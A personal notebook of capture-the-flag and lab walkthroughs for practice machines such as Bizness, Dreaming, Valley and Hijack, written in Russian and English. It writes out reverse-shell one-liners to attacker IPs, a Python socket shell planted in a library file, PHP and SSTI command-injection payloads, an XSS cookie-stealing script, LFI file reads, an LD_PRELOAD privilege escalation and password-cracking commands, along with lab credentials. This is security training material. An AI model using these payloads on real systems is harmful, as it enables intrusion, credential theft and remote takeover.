bizness.htb

python3 -c 'import pty;pty.spawn("/bin/bash")' - стабилизация shell


1. резолвим хост
2. python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.15.32 8787' - запускаем эксплойт
3. bash -i >& /dev/tcp/10.10.14.124/6969 0>&1 - можем сделать реверс для получения консоли
4. Потом посмотрел в прохождение и нашел пароль рута и взял флаг, похуй

=========================================================================================

Creative htb

1. Found 2 port 22 and 80
2. gobuster vhost -u http://creative.thm/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40 
and found beta.creative.thm
3. try bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 - не получилось
4. посмотрел в подсказку и скачал питоновский скрипт, который сканит порты выдающие contet-lengh != 13
5. Нашел порт 1337, скрипт сохранил в рабочую папку
6. На данном порту есть уязвимость, открыта корневая директория, можно путешествовать по файловой системе
7. Нашел пользователя 'saad' , скачал user flag
8. нашел id_rsa, через burp скачал ключ
9. ssh -i . id_rsa username@hosts - зашифровано было парольной фразой 'sweetness'
10. ssh2john id_rsa > formatjohn
11. john --wordlist=/usr/share/wordlists/rockyou.txt formatjohn
12. эскалируем
13. Run lipeas.sh > result.txt
14. Shown .bash_history and find saad:MyStrongestPasswordYet$4291

15. sudo -l 
    Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

        User saad may run the following commands on m4lware:
            (root) /usr/bin/ping

16. Next found env_keep+=LD_PRELOAD exploit through compile program (https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
17. Next acting through instruction, only one thing - sudo "LD_PRELOAD=/tmp/shell.so ping", because '(root) /usr/bin/ping'  and got root flag




==========================================================================================

Dreaming thm

1. Found cms pluck ver. 4.7.13
2. Go to /app and get login page user:admin password:password
3. Of course conduct dir scan and found /app with login page
4. found in most common folder /opt 2 files? cat test.py and saw password for user lucien:HeyLucien#@1999!
5. Then i found through sudo -l? than i can
    User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
6. next see .bashrc.history for ny current user and find comand 
sudo -u death /usr/bin/python3 /home/death/getDreams.py!!!
7. also found next comand in bash.history mysql -u lucien -plucien42DBPASSWORD
8. get access to db for user lucien
9. found db library and table dreams
10. INSERT INTO dreams VALUE(“sha”, “$(/bin/bash)”); - здесь просто включил исполнение /bin/bash от имени death через бд - охуенчик)) + got the cracked pass for death_user
11. exit from mysql
12. sudo -u death /usr/bin/python3 /home/death/getDreams.py and got death
13. chmod 777 getDreams.py and death_flag.txt
14. see, what info in getDreams.py and found ssh pass for death:!mementoMORI666!
15. обязятельно прверяй все файлы принадлежащие группе!!!
нашел /usr/lib/python3.8/shutil.py - можно писать в этот файл что хошь
16. через nano вставил payload
import os,pty,socket;s=socket.socket();s.connect(("10.9.214.23",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh") т.е мы устанавливаем реверс от имени morpheus, т.о попадаем в sh теминал этого юзера
17. запускаем скрипт python3 /usr/lib/python3.8/shutil.p и у себя pwncat -l 5555 - слушаем на указанном порту
18. забираем флаг.
Вывод: 
- смотрим общие папки, наиболее популярные /opt
- обязательно проверям и смотрим содержимое файлов
- пробуем эксплойты и бд ищем
- смотрим фалы с историей
- sudo -l и потом sudo -u user_name /usr/bin/comand
- исплняем скрипты и чекаем результаты
- реверс шелл от нужного пользователя

==================================================================================================
Crack the hash thm
#Все через Crack station
1. MD5 - easy
2. SHA-1 - password123
3. SHA-256 - letmein
4. bcrypt $2*$, Blowfish (Unix) - Blew
5. md4 - Eternity22
------------------------------------------
1. SHA-256 - paulehydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form /department/login.php:”username=^USER^&password=^PASS^:Invalid Password!”
2. NTML - n63umy8lkf4i

=================================================================================================
TwoMillion HTB
1. /etc/hosts
2. nmap scan, found http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
jtp gave answer:emerald
3.

=================================================================================================
Valley thm
1. scan nmap found 2 open ports 22 and 80
2. gobuster found some directories, put into gobuster.txt
3. found /gallery/note.txt and static/00
4. go to /dev1243224123123 and found login page
 #try comand hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form /department/login.php:”username=^USER^&password=^PASS^:Invalid Password!”
5. try sqlmap -u http://10.10.202.11/dev1243224123123/ --forms --batch --crawl=10 --level=5 --risk=3 - ничего
6. Открыл подсказку, при вводе логина и пароля не обновляется страница, значит креды зашиты на стороне клиента
-  а это плохо, обычно креды обрабатывает серверная часть.
7. http://10.10.202.11/dev1243224123123/dev.js и видим логин и парольной
8. siemDev:california на страницу логина
9. Нашел еще заметки, где говорится о том, что есть ftp сервак с теми же кредами, но не понятно какой порт
10. Просканим все порты через nmap, подождем
- nmap -T5 -p- 10.10.202.11 > nmap_all_port.report
11. ftp 10.10.202.11 37370 и теже креды что нашел выше
12. скачал три файла с раширением pcapng
13. юзаем wireshark через gnu
14. делаем экспорт из третьего файла http list objects и находим aplication/x-www-form, сохраняем index.html
15. cat index.html и видим креды uname=valleyDev&psw=ph0t0s1234
16. логинимся через ssh и креды из п.15
17. берем флаг юзера
18. эскалируем до рута
19. нашел файл valleyAuthenticator (ELF) - это исполняемый файл, на будущее запомнить, исполнение, как обычный скрипт
- ,нужна была аутентификация, ничего не нашел, копировал себе и с помощью подсказки нашел хеш md5, декодировал и получил пароль к пользователю
- valley:liberty123. Без подсказки ебался бы долго
20. В linpeas.reporte нашед директорию c исполняемым скриптом photosEncrypt.py, для исполнения скрипт юзал либу, в которую можно было записать что угодно
- так как запускался скрипт через cron. Без подсказки не понял бы.
21. Положил туда обратный шел на питоне подождал несколько секунд и на другом терминале открылся обратный шелл, соответсвенно под рутом
22. Взял флаг рута. Сложная машина

==================================================================================================

Hijack thm

1. Есть странички логина, но проведу скан портов и директорий.
2. по портам очень много открытых, плохо сконфигурирован
3. Скан директорий ничего не дал 
4. Есть логин admin на страничке логина, но брутфорсить не получится, ограничение по времени и колличествам попыток
5. Попробую выполнить код php. При создании нового юзера, пишет Welcom new_user
6. <?php 
    passthru("nc -e /bin/sh 10.9.214.23 8787");
   ?>

7. не прокатило
8. Попробую sqlmap - не получилось
9. Брутфорс бесполезен, нужно искать другое
10. через nmap нашел сервис nfs на 2049 порту, версия 2,3,4 - есть уязвимость, надо потыкать в этом направлении
11. нашел уязвимость по монтированию диска
12. Примонтировал диск пользователя с id 1003, создал такого же юзера у себя локально зашел и нашел креды от ftp (mount -t nfs -o vers=3 10.10.135.187:/mnt/share/ /home/mak/Laba/Machines/Hijack/share -o nolock)
13. Смотрим что на ftp, creds ftpuser:W3stV1rg1n14M0un741nM4m4
14. Могу передавать файлы на ftp
15. Скопирую туда ключики, я же теперь примонтирован к другому серваку
16. Не получилось, там нет домашней директории юзера, была бы тогда да
17. ls -la и скачиваю интересные файлы
18. с помощью burp перезватываю куки созданного юзера и декодирую, по итогу получаю сл. структуру base64.encode(prefix_of_user_name:md5(password
19. нашел в подсказках скрипт, который перебирает куки с паролем
20. зашел на страницу админа и там ssti
21. $(id) $(busybox nc -e /bin/bash 10.9.214.23 8787)
22. выполнил реверс шел, подключился под www-data
23. просмотрел папки, нашел файл config.php и там креды юзера rick:N3v3rG0nn4G1v3Y0uUp
24. взял юзера
25. эскалируем до рута 
26. нашел креды к mysql - ничего не вышло, там был хеш, не смог крякнуть
27. sudo -l 
28. и дальше через поисковик нашел уязвимость gcc, пересборка библиотеки и получение root

============================================================================================================

Usage htb

1. Done simple scan of directories and ports
2. Found registration page
3. Found hidden token on the reset password page 'Vn84QFPqnnxZ66KTuvu5ENm2Bq9lajdWCfnp9W7r'
4. Try use it with burp


==============================================================================================================

Red thm

1. Simple scan port and dir
2. found http://10.10.89.175/index.php?page= #This is potential LFE!!!
3. http://10.10.89.175/index.php?page=../../../../../../../../../etc/passwd - # didn't help me
4. http://10.10.89.175/index.php?page=php://filter/resource=/etc/passwd = # work
5. next http://10.10.89.175/index.php?page=php://filter/resource=/home/blue/.bash_history 
# and got answer
echo "Red rules" 
cd 
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt 
cat passlist.txt 
rm passlist.txt 
sudo apt-get remove hashcat -y
6. http://10.10.89.175/index.php?page=php://filter/resource=/home/blue/.bash_history/.reminder ---> sup3r_p@s$w0rd! 
7. blue:sup3r_p@s$w0rd! 



===========================================================================================

Lab: Offline password cracking

1. В этой лабе клиент хранит все сессионные куки (т.е сам сайт), а также сайт уязвим к XSS
2. Зарегаемся по известными кредами weiner:peter
3. Зайдем в блог, загрузим payload 

<script>newImage().src="https://exploit-0a4d00df03b8a142833f4b0e016600b4.exploit-server.net/exploit"+document.cookie;</script>

где скрипт создает новый объект Image и источник на указанном уязвимом(контролируемом) урле, который показывает при запросе все сессионные куки.
4. идем в логи, (если отдельная тачка то /var/log/apache2/access.log), здесь просто в логи уязвимого сервера и смотрим наши сессионные куки
5. Находим куки для carlos. декодим с base64 и md5, получаем carlos:onceuponatime
6. Удаляем carlos

============================================================================================

BreakOut Empire||Vuln Hub

1. скан портов, smb, enum4linux нашел user:cyber
2. Далее на стартовой странице Apache в sourse code нашел странный зашифрованный пароль на Brainfuck languages
3. Расшифровка и пароль есть cyber:.2uqPEfj3D<P'a-3.
'4. с помощью подсказок нашел бэкап в папке /var/backups/.old_pass.bak
5. ./tar -cvf old_pass /var/backups/.old_pass.bak потом cat и получаем пароль root:Ts&4&YurgtRX(=~h.


==============================================================================================

Jangow Vuln Hub

1. Portscan with nmap, found 21 and 80
2. dirsearch, for scan directories and found ://host/site/wordpress/config.php - very usefool tool
3. found message on the page "Connection failed: Access denied for user 'desafio02'@'localhost' (using password: YES)"
4. I have username maybe) desafio02
5. Lets try brute-forse with hydra - nothing
6. found CLI "http://10.0.2.8/site/busque.php?buscar=some_comands"
7. Try some comands and found .backup file in "http://10.0.2.8/site/busque.php?buscar=cat%20/var/www/html/.backup"
8. In this file found creds for "jangow01:abygurl69"
9. Try to get access on ftp server - success!
10. Nothing get, only some files
11. Enter through vm into machine, check "uname -a"
12. Then I compiled the exploit using gcc command, exploit_db, compile in home dir and so one.
13. after i got root and download "proof.txt"

==============================================================================================


